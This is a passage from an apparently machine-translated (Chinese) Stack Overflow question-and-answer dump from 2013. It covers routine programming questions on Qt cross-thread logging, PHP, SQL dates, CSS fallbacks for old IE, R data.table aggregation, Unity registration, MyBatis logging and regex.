    LogWriter * obj;

    public:
    bool print;

    Log(bool _print,QString _color,LogWriter *obj_ = NULL)
    {print = _print; color = _color; obj = obj_;}
    void setLock(QMutex *print_lock_){print_lock = print_lock_;}
    void setTextField(QPlainTextEdit *_text) {text_place = _text;}
    Log& operator<<(QString &a);
    Log& operator<<(const char* a);
};

static LogWriter* getInstance()
{
    static LogWriter    instance; // Guaranteed to be destroyed.
                              // Instantiated on first use.
    return &instance;
}
~LogWriter();

Log LOW,MEDIUM,HIGH;
Ui::LogWindow *ui;

signals:
void signalLogAppend(QString);
}; 
```

方法定义的简化代码：

```
LogWriter::LogWriter(QWidget * parent): QDialog(parent) {

ui = new Ui::LogWindow;
ui->setupUi(this);

LOW.setLock(&print_lock);
MEDIUM.setLock(&print_lock);
HIGH.setLock(&print_lock);

connect(this,SIGNAL(signalLogAppend(QString)),ui->plainTextEdit, 
SLOT(appendHtml(QString)),Qt::DirectConnection);

}

LogWriter::Log& LogWriter::Log::operator<< (QString &s){
history.push_front(qMakePair(s,time(NULL)));
if(history.size() > MAX_SIZE) history.pop_back();

if(print){
    //print_lock->lock();

    QString text = "<font color=\"";
    text += color + "\">";
    text += s + "</font>";
    //cout << text.toStdString() << endl;
    //text_place->appendHtml(text);
    //text_place->repaint();
    emit (obj)->signalLogAppend(text);
    //print_lock->unlock();

}
return *this;
} 
```

我有两个单独的 ui 文件（第一个用于主窗口，第二个用于日志窗口）。我必须在整个程序中使用日志窗口（大约 10 个线程），我坚持这个问题。我的问题是 - 是否可以在不使用主线程的情况下强制 GUI 更新，如果没有 - 我还有什么可能性。如果可能的话，我宁愿避免重构我的所有代码——这需要我一些时间来完成。现在记录非常容易 - 我只需要：

```
 LogWindow *log = LogWindow::getInstance();
 log->MEDIUM << "something"; 
```

作为附加信息，我添加了 QTCreator 警告：

```
 QObject::connect: Cannot queue arguments of type 'QTextBlock'
   (Make sure 'QTextBlock' is registered using qRegisterMetaType().)
   QObject::connect: Cannot queue arguments of type 'QTextCursor'
   (Make sure 'QTextCursor' is registered using qRegisterMetaType().) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:11:39.657

如果我正确理解您的代码，您是否正在尝试从后台线程登录并使用直接连接将信号传递给 GUI 线程？那是行不通的，您必须通过默认连接发送信号，以便 Qt 可以确定它是一个跨线程信号并相应地跨线程传递（即，通过前台线程上的消息循环）。

在 Qt 中，任何 GUI 交互都必须发生在主/前台线程中，否则会发生您发现的坏事。您当然可以从后台线程发送信号来触发 GUI 更新 - 我一直这样做 - 但您需要确保使用正确的连接。直接连接会导致直接函数调用，在这种情况下对您不起作用。

在您的代码中，问题是对[connect()](http://qt-project.org/doc/qt-4.8/qobject.html#connect%60)的调用- 当您应该只使用默认设置时，您明确指定信号到插槽连接的连接模式。如果将连接显式设置为`Qt::DirectConnection`，则底层代码将执行对指定槽的直接调用，这意味着您最终会在信号的线程上下文中调用槽。您不希望这样，因为信号是在后台线程中触发的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:18:00.827

您不能将任意类型/类传递给信号和插槽。该列表是有限的，并非所有 Qt 类都在列表中。要将类型/类添加到可以传递给信号/插槽的列表中，您必须为该类调用 qRegisterMetaType。我建议在您尝试传递给这样的信号的类的构造函数中调用它：

```
MyClass::MyClass() : MyParentClass()
{
    static int reg = qRegisterMetaType<MyClass>("MyClass");
} 
```

静态 int 确保只在 MyClass 的任何实例可以使用之前调用一次注册。

# php - 带有数字的PHP字符串，用空格分隔到数组

> ID：15232024
> 
> 赞同：0
> 
> 时间：2013-03-05T19:04:57.103
> 
> 标签：php, variables

我正在尝试将一些变量（数字）存储在一个数组中的单个字符串中。就像，如果我会使用类似的东西

```
"1 0 0 1 1 0 0 1 1" 
```

将每个数字存储在数组中，例如：

```
numbers[i]; 
```

我确信有一个 PHP 函数可以解决这个问题，不胜感激。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-05T19:06:07.063

您应该可以使用`$numbers = explode(' ', $string);`. 这将创建一个基于空格作为分隔符的数组。

更多信息在这里：[http ://www.php.net/manual/en/function.explode.php](http://www.php.net/manual/en/function.explode.php)

# c# - 添加 Crystal Report DLL 的引用

> ID：15232026
> 
> 赞同：2
> 
> 时间：2013-03-05T19:05:05.433
> 
> 标签：c#, .net, visual-studio-2012, crystal-reports

我的操作系统是 Windows 7 x64。运行 VS Professional 2012。我正在使用 C# 编写并为使用 Crystal Report 的 .NET Framework 4.0 开发的软件。我已经在机器上安装了 Crystal Report for Developers 版本 13.0.5。

我想将 Crystal Report 所需的 DLL 复制到项目的输出文件夹中。目的是将它们与安装程序一起打包，以便安装软件的 PC 不需要安装 Crystal Report。

我创建了一个名为 DLLs 的文件夹，并将所需的 Crystal Report DLLs 放在该文件夹中。然后在解决方案资源管理器的 C# 项目的引用节点中，我添加了位于 DLLs 文件夹中的 DLL。当我查看添加的 DLL 的属性 > 路径时，令人惊讶的是，我发现路径包含我复制的 DLL 的路径（C:\Program Files... 而不是 D:\Work...）。

为什么会这样？如何添加对复制的 DLL 而非原始 DLL 的引用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T00:39:49.800

简短的回答：Crystal Reports 不能在没有安装在客户端机器上的情况下工作。您可以做的是对 Crystal Reports 安装程序的功能进行一些研究，并在您的应用程序中自行操作。看[这里](https://stackoverflow.com/questions/1695546/deploy-crystal-report-dlls-only-using-clickonce-without-using-prerequisite-msi)

其他来源：[这里](http://msdn.microsoft.com/en-us/library/aa287928%28v=vs.71%29.aspx)和[这里](https://stackoverflow.com/questions/15130508/cannot-load-file-or-assembly-crystal-decisions-windows-forms-version-13-0-2000/15163363#15163363)，或谷歌它。

问候

# facebook - Facebook 用户 ID 是如何工作的？

> ID：15232032
> 
> 赞同：0
> 
> 时间：2013-03-05T19:05:22.780
> 
> 标签：facebook, facebook-fql

我想大致检查用户何时使用 Facebook Graph API 和 FQL 加入 Facebook。我注意到早期 Facebook 成员的 ID 较小，而后期加入者的 ID 较大。

我们可以通过查看会员的 ID 来估计会员加入 Facebook 的时间吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:10:52.873

不。你是对的，理论上你可以使用一些 ID（注册 FB 前几年的人）。但是，您需要对不同时间的 FB 增长率有深入的了解，才能确定实际估计的时间范围。

但现在，你不能。Facebook 上的每个对象都有一个全球唯一的 ID。每个用户、页面、组、帖子、照片、视频等都是唯一的 ID。因此，现在尝试确定时间范围是不切实际的。

# javascript - 在 JavaScript 中访问不同层次结构级别的重复 XML 标记

> ID：15232039
> 
> 赞同：0
> 
> 时间：2013-03-05T19:05:32.590
> 
> 标签：javascript, jquery, xml

我有一个使用以下层次结构的 XML 文件；

```
 item
        item
            (item details)
        item
            (item details)
    item
        item
            (item details)
        item
            (item details)
        item
            (item details) 
```

ETC..

我希望能够在第一级访问每个“项目”标签，并且对于其中的每一个，访问该（第二级）内的“项目”并将其详细信息（第三级）分配给每一秒的单个对象级别项目。我可以使用 jQuery 搜索每个项目标签，但这显然会在两个级别上通过“项目”标签，而不仅仅是第一级。

如何检索每个第一级项目，然后将其用作访问其中项目的参考（因此每个第二级项目一次处理一个）？

试图尽可能清楚地表达这一点，我不喜欢重复使用“项目”标签，但遗憾的是它超出了我的控制范围......谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:19:21.670

我建议反过来做：

*   `$("item>item")`只会让您访问二级项目标签。
*   对于每个二级项目，使用 parent() 访问相关的一级项目

您还可以使用`$("item")`获取所有项目，然后`$(this).find("item")`在循环中使用以获取第二级项目。如果`$(this).find("item")`长度为 0，则表示这`this`是第二行项目：

```
$("item").each(function(){
    var childrenItems=$(this).find("item");
    if (childrenItems.length) {
        // process the children items
    }
}); 
```

# sql - SQL Where 语句中的数字到日期

> ID：15232043
> 
> 赞同：-2
> 
> 时间：2013-03-05T19:05:51.343
> 
> 标签：sql, date, format, where

我有一个有 2 列的表，EffectiveBeginDate 和 EffectiveEndDate。但是，它们采用数字 YYYYMMDD 格式，例如：

代理 | 有效开始日期 | 有效结束日期

约翰·多伊 | 20080922 | 20080924

马克史密斯| 20100922 | 20110226

等等等等

我需要做两件事。首先，我需要有一个公式来在我的 Select 语句中将 EffectiveBegin/End 日期更改为实际日期格式。

更重要的是，我需要能够在 where 语句中查询此列，就好像它们是实际日期 b/c where 子句将类似于：

其中 EffectiveStartDate 在 '01/01/2010' 和 '01/31/2010' 之间

想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:11:33.627

在 SQL SERVER 中执行就足够了`CONVERT(DATETIME, dateTimeField)`在 SQL SERVER 中，当 dateTimeField 的格式为“yyyymmdd”时

更新：

对于数字日期，请使用： `CONVERT(DATETIME, CONVERT(char(8),dateTimeField) )`

# cakephp - CakePHP 无法在控制器中创建/查找操作

> ID：15232050
> 
> 赞同：0
> 
> 时间：2013-03-05T19:06:13.790
> 
> 标签：cakephp, php

我在 CakePhp 中创建附加视图时遇到了一些麻烦据我了解，您需要匹配视图文件名和控制器功能。该函数在正确的控制器中，但 CakePHP 仍然给我这个错误：

```
Error: The action userMutualFriends is not defined in controller UserProfileController

Error: Create UserProfileController::userMutualFriends() in file: app\Controller\UserProfileController.php.

<?php
class UserProfileController extends AppController {

    public function userMutualFriends() {

    }

} 
```

虽然我将完全相同的功能粘贴到控制器中。我对 CakePhp 没有经验，所以也许我只是错过了一些东西..

谢谢，山姆

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:39:57.027

我是最大的白痴，正在使用备份，所以更改了错误的文件。抱歉浪费你的时间。

# css - 旧 IE 后备最便宜的方法：modernizr、star hacks 还是其他？

> ID：15232055
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:06:25.100
> 
> 标签：css, internet-explorer, modernizr

这是大多数浏览器支持的示例样式：

```
.class {
     background: rgba(0,0,0,0.3);
 } 
```

旧 IE (IE 6-8) 不支持`rgba`. 我至少可以使用三种方法来支持这一点。

1.  同班

    ```
    .class {
         background: grey;
         background: rgba(0,0,0,0.3);
    } 
    ```

2.  现代化

    ```
    .class {
         background: rgba(0,0,0,0.3);
    }

    .no-rgba .class {
         background: grey;
    } 
    ```

3.  明星黑客

    ```
    .class {
         background: rgba(0,0,0,0.3);
         background: grey\9; /*IE8 and below*/
     } 
    ```

我更喜欢使用方法 1 和 2，因为它们涵盖的不仅仅是 IE 浏览器，但我不确定应该使用哪种方法。

方法 1 很好，因为即使 JS 被禁用，它也可以工作。但是，所有现代浏览器都需要渲染一个额外的属性。

方法 2 很好，因为它将坏浏览器隔离到它们自己的类中。现代浏览器不会渲染这个类，这样可以节省几毫秒的渲染时间。

也许还有其他我没有想到的东西可能会更好？我想避免使用 PIE.htc 或过滤器。优化和加载时间的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T20:37:41.383

对于这种风格，正确答案是您列出的第一个：

```
.class {
     background: grey;
     background: rgba(0,0,0,0.3);
} 
```

首先指定回退选项，然后是首选选项。

IE 将背景设置为，`grey`因为它不支持`rgba`；其他浏览器将按`rgba`预期使用该版本。

这是最佳答案的原因是：

1.  对于这个确切的场景，这是规范的“正确”答案：CSS 被设计为以这种方式工作，正是考虑到这种情况。

2.  这是最便宜的选择，因为没有浏览器需要做任何额外的渲染或脚本。IE 将完全忽略第二个`background`，所以那里不会发生任何额外的事情；其他浏览器将同时解析两者，但解析第二个浏览器将覆盖已为第一个解析的内容，因此唯一的开销是解析，无论您选择哪个选项，都必须这样做。

在其他可能的解决方案中，Modernizr 非常棒，但对于这种情况来说过于矫枉过正——如果您有一个不涉及任何脚本的解决方案，则无需使用脚本解决方案。并且应该不惜一切代价避免 CSS hack。可能在某些情况下它们值得使用，但自从我停止尝试支持 IE6 以来，我个人还没有看到一个合法的用途。

另一个可用但您没有提到的解决方案是条件注释：即使用 IE 的`<!--[if IE]>`语法为 IE 加载替代样式表。但是，如果可能的话，我也会避免这种情况，而且，随着 IE6 和 IE7 成为更遥远的记忆，对这种解决方案的需求正在逐渐消失。

最后，给你一个稍微不同的选择：忽略旧的 IE。对于某些事情，IE8 可能无法按照您想要的方式呈现，而且这样做很痛苦。在这些情况下，让它失败是一个完全合理的策略。对于问题中的示例，这不是必需的，因为我们有一个非常好的 CSS 解决方案，但对于其他更复杂的样式，请考虑如果 IE 不正确，网站看起来会有多糟糕；如果它仍然可用，那么可能有一个简单的让它滑动的情况。此选项需要与将受到影响的用户数量及其对他们造成的问题的程度以及您正在努力满足的要求进行权衡，但应将其视为一个选项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:47:41.340

您的方法 #1 是普遍接受的方式，因为它不仅处理 IE，而且还处理**任何不支持相关 CSS 的浏览器**（在本例中为 RGBA）。浏览器应该遵循的 CSS 规则是，如果它们无法识别一行，它们会忽略它并继续前进。至于功能更强大的浏览器，像这样的 CSS 很便宜，而且浏览器甚至可能根本不渲染后备 CSS（我知道大多数人不会下载基于图像的后备的图像）。

方法 2 不仅添加了类（增加了权重），而且添加了整个 JavaScript 库。如果您正在处理一堆其他 CSS3 类型的东西（尤其是没有这么简单的后备的东西），那么这没什么大不了的，但是如果您用来处理诸如此类的后备，或者只是一个或二，那么你会增加很多开销（包括可能的另一个 HTTP 请求），而不会带来很多额外的好处。即使现代浏览器不呈现这些类，它们也必须运行 JavaScript 来检查功能。

方法 3**是**一种 hack，应尽可能避免（我建议使用条件样式表而不是诉诸 hack）。它不仅只针对特定浏览器的特定版本（从而使所有其他不支持此 CSS 的浏览器都被冷落），而且依赖于浏览器中的错误来完成工作。如果该代码在不同的浏览器中触发了不同的错误，或者如果浏览器识别出带有 hack 的行，但使用正确的 CSS 也能正常运行，会发生什么？看看 2005 年左右的一些教程，当时 IE6*和*IE5 for Mac 仍然是主要的竞争者，并且看到人们疯狂地使用浏览器黑客来防止他们踩到彼此的脚趾。（注意：我不认为带前缀的 CSS 是 hack。带前缀的 CSS 项是浏览器供应商选择添加的记录功能，并服务于沙箱化这些功能的既定目的。如果它们是为了使其成为标准的东西，那么它们旨在随着时间的推移逐步淘汰。）

因此，按照优先顺序 - Fallback CSS、Modernizr、Conditional Stylesheets、Browser Hacks。

# ruby-on-rails-3 - 在 Rails 中使用数据库中的记录填充动态选择菜单

> ID：15232059
> 
> 赞同：0
> 
> 时间：2013-03-05T19:06:37.120
> 
> 标签：ruby-on-rails-3, activerecord

我试图根据上一个菜单中的用户选择来填充选择菜单。我只使用一种模型来存储用户过滤的所有记录。我遇到的问题是仅获取唯一记录，而不是基于先前选择的所有记录。

**学校控制器**

```
 class SchoolsController < ApplicationController
  def region
    @user = current_user
    @regions = School.select(:region).uniq.order(:region)
  end

  def municipalities
    @municipalities = School.where(:region => params[:region]).uniq

  end
end 
```

**模型**

```
 # == Schema Information
#
# Table name: schools
#
#  id           :integer          not null, primary key
#  region       :string(255)
#  municipality :string(255)
#  school       :string(255)
#  created_at   :datetime         not null
#  updated_at   :datetime         not null
#

class School < ActiveRecord::Base
  attr_accessible :region, :municipality, :school
  has_many :users
end 
```

**region.html.erb**

```
 <%= form_tag 'municipalities' do %>
<p><%= select_tag(:region, options_from_collection_for_select(@regions, 'region', 'region')) %>
</p><p>
<%= submit_tag 'Nästa', :class=> 'btn btn-primary' %>
    </p>
<% end %> 
```

**市政当局.html.erb**

```
<%= form_tag 'schools' do %>
<p><%= select_tag(:municipalities, options_from_collection_for_select(@municipalities ,:municipality ,:municipality )) %>
</p><p>
<%= submit_tag 'Nästa', :class=> 'btn btn-primary' %>
    </p>
<% end %> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-16T12:45:26.240

看看 Ryan 在动态选择菜单上的 railscast [http://railscasts.com/episodes/88-dynamic-select-menus-revised](http://railscasts.com/episodes/88-dynamic-select-menus-revised)。或者看看 dynamic_form gem。

两者都可以解决问题，dyanic_form gem 像您期望的那样消除了很多编码，并且使用了更多的 coffescript 而不是 javascript

# c# - 如何自动化 Unity 注册？

> ID：15232061
> 
> 赞同：0
> 
> 时间：2013-03-05T19:06:38.540
> 
> 标签：c#, unity-container, repository-pattern, abstract, base

在我的代码中，我有很多这样的重复动作。我想编写 1 个通用方法（带有反射）来自动化这个具有一个基类的对象的注册存储库过程

```
 _container.RegisterType(typeof(IFinanceRepository<User, int>), typeof(UsersRepository), new TransientLifetimeManager(), new InjectionMember[] { });
        _container.RegisterType(typeof(IFinanceRepository<News, int>), typeof(NewsRepository), new TransientLifetimeManager(), new InjectionMember[] { });
        _container.RegisterType(typeof(IFinanceRepository<Currency, int>), typeof(CurrenciesRepository), new TransientLifetimeManager(), new InjectionMember[] { });
        _container.RegisterType(typeof(IFinanceRepository<Language, int>), typeof(LanguagesRepository), new TransientLifetimeManager(), new InjectionMember[] { }); 
```

和

```
public class UsersRepository : EFFinanceRepository<User, int> 
```

所有对象（用户、新闻等都有基本接口 - IObject 有 T - 是 ID 属性的类型（Guid、int 等）

```
 public class User : IObject<int>
{
    /// <summary>
    /// every object ID
    /// </summary>
    public int ID { get; set; } 
```

所有存储库都有基类

```
IOvolimeFinanceRepository<T, in IDType> 
```

其中 T - IObject (User, News) IDType - 每个对象 i 的 ID 属性类型

帮助我，请生成完整的抽象通用方法来自动化这个！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T16:43:00.907

您可能想考虑使用添加基于约定的注册的 Unity 扩展。那里有几个。我没有使用过它们中的任何一个，但我使用了基于惯例的温莎城堡注册，我非常喜欢它。

*   [Unity 自动注册](http://autoregistration.codeplex.com/)
*   [公约扩展](https://code.google.com/p/conventionextension/)
*   [统一配置](https://github.com/thedersen/UnityConfiguration)
*   [Unity 高级配置引擎](http://tecx.codeplex.com/wikipage?title=AdvancedConfigurationEngineForUnity&referringTitle=Home)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-06T16:24:43.323

您需要为存储库主界面（IOvolimeFinanceRepository）添加简单的界面 - IGenericRepository

```
var types = Assembly.GetExecutingAssembly().GetTypes();

        var concreteRepositoryTypes = (from t in types
                                       where !t.IsAbstract && typeof(IGenericRepository).IsAssignableFrom(t)
                                       select t).ToList();

        foreach (var repositoryType in concreteRepositoryTypes)
        {
            //register like _container.RegisterType(typeof(UsersRepository), typeof(UsersRepository), new TransientLifetimeManager(), new InjectionMember[] { });
            _container.RegisterType(repositoryType, new TransientLifetimeManager(), new InjectionMember[] { });

            var interfaceForRepository = repositoryType.GetInterfaces().FirstOrDefault(x => x != typeof(IGenericRepository));

            if(interfaceForRepository != null)
                _container.RegisterType(interfaceForRepository, repositoryType, new TransientLifetimeManager(), new InjectionMember[] { });
        }
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-30T05:51:05.610

Unity 已经带有按惯例注册。

你没有提到你的目标是哪个版本。我很确定这从 Unity 3.0 开始可用

[http://msdn.microsoft.com/en-us/library/dn507479%28v=pandp.30%29.aspx](http://msdn.microsoft.com/en-us/library/dn507479%28v=pandp.30%29.aspx)

# vb.net - 我将如何制作像语法高亮这样的记事本++？

> ID：15232064
> 
> 赞同：-3
> 
> 时间：2013-03-05T19:06:43.590
> 
> 标签：vb.net, visual-studio-2012, syntax-highlighting

我正在寻找为 Visual Basic 制作一个“代码”编辑器。

我只是想知道如何使用大多数编辑器实现语法突出显示。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:12:37.873

好吧，我[先继承 RichTextBox](https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=11&checkda=1&ct=1362510641&rver=6.0.5276.0&wp=MCLBI&wlcxt=msdn%24msdn%24msdn&wreply=http://msdn.microsoft.com/en-gb/library/system.windows.forms.richtextbox.aspx&lc=1033&id=254354&mkt=en-US)

RichTextBox 使您能够为文本着色、更改字体等。然后您的类可以实现其他功能，如行号、智能感知、显示编译时异常等......

也就是说，要获得一个*好的*，您将不得不进行很多更改 - 并且很可能将其与编译器或自定义解析器以及（可能）与代码一起出现的所有其他东西相关联编辑。

# r - R中的data.table聚合

> ID：15232065
> 
> 赞同：5
> 
> 时间：2013-03-05T19:06:47.320
> 
> 标签：r, data.table

该练习包括通过将因子与 R 中的 data.table 组合来聚合值的数值向量。以以下数据表为例：

```
require (data.table)
require (plyr)
dtb <- data.table (cbind (expand.grid (month = rep (month.abb[1:3], each = 3),
                                       fac = letters[1:3]),
                          value = rnorm (27))) 
```

请注意，'month' 和 'fac' 的每个唯一组合都会出现 3 次。因此，当我尝试通过这两个因素对值进行平均时，我应该期望一个具有 9 个唯一行的数据框：

```
(agg1 <- ddply (dtb, c ("month", "fac"), function (dfr) mean (dfr$value)))
  month fac          V1
1   Jan   a -0.36030953
2   Jan   b -0.58444588
3   Jan   c -0.15472876
4   Feb   a -0.05674483
5   Feb   b  0.26415972
6   Feb   c -1.62346772
7   Mar   a  0.24560510
8   Mar   b  0.82548140
9   Mar   c  0.18721114 
```

但是，当与 data.table 聚合时，我不断得到两个因素的每个冗余组合提供的结果：

```
(agg2 <- dtb[, value := mean (value), by = list (month, fac)])
    month fac       value
 1:   Jan   a -0.36030953
 2:   Jan   a -0.36030953
 3:   Jan   a -0.36030953
 4:   Feb   a -0.05674483
 5:   Feb   a -0.05674483
 6:   Feb   a -0.05674483
 7:   Mar   a  0.24560510
 8:   Mar   a  0.24560510
 9:   Mar   a  0.24560510
10:   Jan   b -0.58444588
11:   Jan   b -0.58444588
12:   Jan   b -0.58444588
13:   Feb   b  0.26415972
14:   Feb   b  0.26415972
15:   Feb   b  0.26415972
16:   Mar   b  0.82548140
17:   Mar   b  0.82548140
18:   Mar   b  0.82548140
19:   Jan   c -0.15472876
20:   Jan   c -0.15472876
21:   Jan   c -0.15472876
22:   Feb   c -1.62346772
23:   Feb   c -1.62346772
24:   Feb   c -1.62346772
25:   Mar   c  0.18721114
26:   Mar   c  0.18721114
27:   Mar   c  0.18721114
    month fac       value 
```

有没有一种优雅的方法可以将这些结果与数据表的每个独特因素组合折叠成一行？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-05T21:37:02.050

*问题（和推理）与分配*聚合值而不仅仅是计算的事实有关。

如果您查看包含更多列的 data.table，而不仅仅是用于计算的列，则更容易观察到这一点。

```
# Therefore, let's add a new column
dtb[, newCol := LETTERS[seq(length(value))] 
```

请注意，如果我们只想*输出*计算值，那么`RHS`您所拥有的表达式就可以了。

```
# This gives the expected results
dtb[, mean (value), by = list (month, fac)]

# This on the other hand assigns the respective values to *each* row
dtb[, value := mean (value), by = list (month, fac)] 
```

换句话说，数据被子集化以仅返回唯一值。
但是，如果您想将此值保存回*SAME*数据表中（使用运算符时会发生这种情况`:=`），那么（默认为所有行）中标识的`i`所有行都将被分配一个值。（当您查看带有附加列的输出时，这是有道理的）

然后将此 data.table 复制到 agg 仍然会发送所有行。

因此，如果要复制到新表，**只有原始表中唯一的那些行**，您可以

```
a.  wrap the original table inside `unique()` before assigning it
b.  assign the table, above, that is returned when you 
    are not assigning the RHS output (which is what @Arun suggested) 
```

一个例子`a.`是：

```
 agg2 <- unique(dtb[, value := mean (value), by = list (month, fac)]) 
```

* * *

## 以下示例可能有助于说明。

*（您需要复制 + 粘贴此内容，因为省略了输出）*

```
 # SAMPLE DATA, as above
  library(data.table)
  dtb.bak <- data.table (expand.grid (month = rep (month.abb[1:3], each = 3), fac = letters[1:3]), value = rnorm (27))

  #  METHOD 1  # 
  #------------#
  dtb <- copy(dtb.bak)  # restore, from sample data.

  dtb[, value := mean (value), by = list (month, fac)]
  dtb

  # this is what you would like to assign
  unique(dtb)

  #  METHOD 2  # 
  #------------#
  dtb <- copy(dtb.bak)  # restore, from sample data.

  # this is what you would like to assign
  # next two lines are the same, only differnce is column name
  dtb[, mean (value), by = list (month, fac)]
  dtb[, list("mean" = mean (value)), by = list (month, fac)]  # quote marks added for clarity

  # dtb is unchanged. 
  dtb

  # NOW COMPARE THE SAME TWO METHODS, BUT IF THERE IS AN ADDITIOANL COLUMN
  dtb.bak[, newCol := rep(c("A", "B", "A"), length(value)/3)]

  dtb1 <- copy(dtb.bak)  # restore, from sample data.
  dtb2 <- copy(dtb.bak)  # restore, from sample data.

  # Method 1
  dtb1[, value := mean (value), by = list (month, fac)]
  dtb1
  unique(dtb1)

  #  METHOD 2  # 
  dtb2[, list("mean" = mean (value)), by = list (month, fac)]  # quote marks added for clarity
  dtb2

  # METHOD 2, WITH ADDED COLUMNS IN list() in `j`
  dtb2[, list("mean" = mean (value), newCol), by = list (month, fac)]  # quote marks added for clarity
  # notice this has more columns thatn 
  unique(dtb1) 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-05T19:08:39.783

你应该做：

```
agg2 <- dtb[, list(value = mean(value)), by = list (month, fac)] 
```

`:=`将回收 的值`RHS`以适应`LHS`. `?':='`阅读更多关于此的内容。

# css - jQuery-ui：本地和远程包含样式表之间的差异

> ID：15232067
> 
> 赞同：0
> 
> 时间：2013-03-05T19:06:49.313
> 
> 标签：css, jquery-ui

当我为可调整大小的 jquery-ui 对话框远程包含 jquery-ui 样式表时，就像这样

```
<link rel="stylesheet" type="text/css" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.8.18/themes/start/jquery-ui.css" /> 
```

我得到这个结果：

![在此处输入图像描述](../Images/9cb857717d972a65c8d5846cd43d781e.png)

但是当我下载相同的文件并像这样在本地包含它时

```
<link rel="stylesheet" type="text/css" href="./jquery-ui.css" /> 
```

我得到这个结果：

![在此处输入图像描述](../Images/b988653aa2fa5aca02aba194e3cb31cf.png)

请注意右下角缺少的调整大小手柄，这似乎是唯一的区别。

造成差异的原因是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T19:18:50.390

Jquery-ui 引用了一堆图像精灵表。当包含来自 ajax.googleapis.com 的引用时，图像的路径会正确解析，因为谷歌将这些图像托管在他们的服务器上并将它们放在正确的位置。但是，在您本地的 jquery-ui.css 副本中，我猜您的图像很可能不在正确的位置。

我在当前项目中使用 jquery ui，我的文件夹结构是：

```
Content
  images            <--- this is the jquery ui sprite iamges folder
  jquery-ui.css 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:18:51.687

转到**/jquery-ui.css**并确保 bg 路径是正确的路径

# java - 如何在 jboss 中启用 MyBatis SQL 日志？

> ID：15232074
> 
> 赞同：2
> 
> 时间：2013-03-05T19:07:05.773
> 
> 标签：java, eclipse, jboss, mybatis

我无法在 JBoss 服务器日志中看到 MyBatis 生成的 SQL，我在下面的 jboss-log4j.xml 中添加了启用它，它之前确实有效，但由于某种原因停止工作。我们需要做任何其他配置来启用它。

```
 <logger name="org.apache.ibatis"> 
      <level value="debug"/> 
      <appender-ref ref="CONSOLE"/> 
    </logger> 

    <logger name="java.sql"> 
      <level value="debug"/> 
      <appender-ref ref="CONSOLE"/> 
    </logger> 

    <logger name="java.sql.Statement"> 
      <level value="debug"/> 
      <appender-ref ref="CONSOLE"/> 
    </logger>

   <root>
      <!-- 
         Set the root logger priority via a system property. Note this is parsed by log4j,
         so the full JBoss system property format is not supported; e.g.
         setting a default via ${jboss.server.log.threshold:WARN} will not work.         
       -->
      <priority value="${jboss.server.log.threshold}"/>
      <appender-ref ref="CONSOLE"/>
      <appender-ref ref="FILE"/>
   </root> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T21:13:46.683

问题`jboss-log4j.xml`在于 CONSOLE appender 中的阈值，

将 INFO 更改为 DEBUG 后，它可以正常工作

```
<appender name="CONSOLE" class="org.apache.log4j.ConsoleAppender">
      <errorHandler class="org.jboss.logging.util.OnlyOnceErrorHandler"/>
      <param name="Target" value="System.out"/>
      <param name="Threshold" value="INFO"/>

      <layout class="org.apache.log4j.PatternLayout">
         <!-- The default pattern: Date Priority [Category] Message\n -->
         <param name="ConversionPattern" value="%d{ABSOLUTE} %-5p [%c{1}] %m%n"/>
      </layout>
   </appender> 
```

到

```
 <appender name="CONSOLE" class="org.apache.log4j.ConsoleAppender">
      <errorHandler class="org.jboss.logging.util.OnlyOnceErrorHandler"/>
      <param name="Target" value="System.out"/>
      <param name="Threshold" value="DEBUG"/>

      <layout class="org.apache.log4j.PatternLayout">
         <!-- The default pattern: Date Priority [Category] Message\n -->
         <param name="ConversionPattern" value="%d{ABSOLUTE} %-5p [%c{1}] %m%n"/>
      </layout>
   </appender> 
```

# ruby - 多行正则表达式：在 B 不存在的地方查找 A

> ID：15232075
> 
> 赞同：0
> 
> 时间：2013-03-05T19:07:06.773
> 
> 标签：ruby, regex

我最近在 Regex 上浏览了很多内容，并且看到了很多涉及匹配一个单词的答案，而第二个单词则不存在。我看过很多正则[表达式示例](http://www.regular-expressions.info/completelines.html)，我可以在其中使用正则表达式搜索给定的单词（或任何更复杂的正则表达式）并找到缺少单词的位置。

似乎在逐行的基础上工作得很好，但是在包括多行模式之后，它似乎仍然不能正确匹配。

[示例](http://rubular.com/r/yTJIQzDpst)：匹配包含该单词的整个文件字符串`foo`，但`bar`文件中不存在该单词。到目前为止，我所拥有的`(?m)^(?=.*?(foo))((?!bar).)*$`是基于[示例链接](http://www.regular-expressions.info/completelines.html)的。我一直在使用 Ruby 正则表达式测试器进行测试，但我认为这是一个开放式正则表达式问题/问题。它似乎匹配较小的部分，我想让它在整个字符串上匹配/不匹配作为一个大块。

在上面提供的示例中，似乎是逐行找到匹配项。需要对正则表达式进行哪些更改才能应用于整个字符串？

**编辑：**我知道还有其他更有效的方法可以解决这个问题，而不涉及使用正则表达式。我不是在寻找使用其他方式解决问题的方法，而是从*理论上的正则表达式的角度提出问题*。它有一个多行模式（看起来“工作”），它有负/正搜索，可以逐行组合，为什么组合这两个原则不会产生预期的结果？

* * *

